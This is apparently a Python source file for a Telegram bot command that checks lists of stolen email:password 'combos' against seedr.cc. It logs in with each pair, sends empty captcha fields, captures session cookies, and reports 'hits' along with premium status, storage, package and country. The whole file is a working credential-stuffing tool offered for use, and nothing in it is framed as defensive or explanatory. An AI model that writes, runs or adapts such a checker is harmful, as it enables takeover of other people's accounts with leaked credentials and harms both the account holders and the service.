import requests
import time

def process_seedr_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ SEEDR ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_seedr_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /seedr email:password")

def check_seedr_account(account):
    try:
        email, password = account.split(':')
        login_url = "https://www.seedr.cc/auth/login"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        data = {
            "username": email,
            "password": password,
            "g-recaptcha-response": "",
            "h-captcha-response": "",
            "rememberme": "off"
        }

        response = requests.post(login_url, headers=headers, json=data)
        response_data = response.json()

        if response_data.get("status_code") == 400:
            return "Incorrect Email OR Password❌"
        else:
            is_premium = response_data.get("is_premium", False)
            rss_session = get_cookie_value(response.cookies, 'RSESS_session')
            rss_remember = get_cookie_value(response.cookies, 'RSESS_remember')

            if not rss_session or not rss_remember:
                return "Failed to retrieve session cookies❌"

            account_info = get_account_info(rss_session, rss_remember)
            if not account_info:
                return "Failed to retrieve account info❌"

            return (f"HIT SUCCESSFULLY✅\n"
                    f"Premium: {is_premium}\n"
                    f"Storage: {account_info.get('storage', 'Unknown')}\n"
                    f"Package: {account_info.get('package', 'Unknown')}\n"
                    f"Country: {account_info.get('country', 'Unknown')}")
    except Exception as e:
        print(f"An error occurred in check_seedr_account: {str(e)}")  # Log error for debugging
        return f"An error occurred while checking the account: {str(e)}"

def get_cookie_value(cookies, name):
    for cookie in cookies:
        if cookie.name == name:
            return cookie.value
    return None

def get_account_info(rss_session, rss_remember):
    try:
        account_url = "https://www.seedr.cc/account/settings"
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': f'RSESS_session={rss_session}; RSESS_remember={rss_remember}',
            'referer': 'https://www.seedr.cc/files',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }

        response = requests.get(account_url, headers=headers)
        response_data = response.json()
        
        if response.status_code == 200:
            return {
                "storage": response_data.get("storage", "Unknown"),
                "package": response_data.get("package", "Unknown"),
                "country": response_data.get("country", "Unknown")
            }
        else:
            return None
    except Exception as e:
        print(f"An error occurred in get_account_info: {str(e)}")  # Log error for debugging
        return None

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"[ CHECK INFO ]\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
